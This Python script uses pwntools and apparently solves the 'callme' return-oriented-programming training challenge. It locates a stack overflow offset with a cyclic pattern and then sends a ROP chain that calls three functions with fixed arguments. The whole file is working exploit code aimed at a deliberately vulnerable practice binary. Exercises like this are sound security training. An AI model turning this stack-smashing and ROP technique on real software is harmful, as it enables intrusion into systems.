#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RPATH:    b'./'

# enable logging
context.log_level = 'debug'

# Find the offset
# start the process
io = process(exe.path)

# send the cyclic
io.sendline(cyclic(256))

# wait for the crash
io.wait()

# read the corefile
core = io.corefile

# read the stack pointer at the time of the crash
stack = core.rsp
info("stack: %#x", stack)

# read 4 bytes from the stack pointer: this is our offset
pattern = core.read(stack, 4)
offset = cyclic_find(pattern)
info("pattern: %r", pattern)
info("offset:  %d", offset)

# CONSTANTS
# these are the thunk function addrs... not sure that's correct.
call_one = 0x401850
call_two = 0x401870
call_three = 0x401810

pop_rdi = 0x401b23
pop_rsi_pop_rdx = 0x401ab1

# build our ROP chain
rop_chain = p64(pop_rdi, endian="little")
rop_chain += p64(0x1, endian="little")
rop_chain += p64(pop_rsi_pop_rdx, endian="little")
rop_chain += p64(0x2, endian="little")
rop_chain += p64(0x3, endian="little")
rop_chain += p64(call_one, endian="little")

rop_chain += p64(pop_rdi, endian="little")
rop_chain += p64(0x1, endian="little")
rop_chain += p64(pop_rsi_pop_rdx, endian="little")
rop_chain += p64(0x2, endian="little")
rop_chain += p64(0x3, endian="little")
rop_chain += p64(call_two, endian="little")

rop_chain += p64(pop_rdi, endian="little")
rop_chain += p64(0x1, endian="little")
rop_chain += p64(pop_rsi_pop_rdx, endian="little")
rop_chain += p64(0x2, endian="little")
rop_chain += p64(0x3, endian="little")
rop_chain += p64(call_three, endian="little")

# this could be anything, but we are going to use a cyclic
# in case we need to debug
padding = cyclic(offset)

payload  = padding + rop_chain

# print our payload in a nice hex format
info("ROP payload: %s", payload)

# open a new process to pwn
io = process(exe.path)

# send off our ROP payload
io.sendline(payload)
io.wait_for_close()
io.recv()


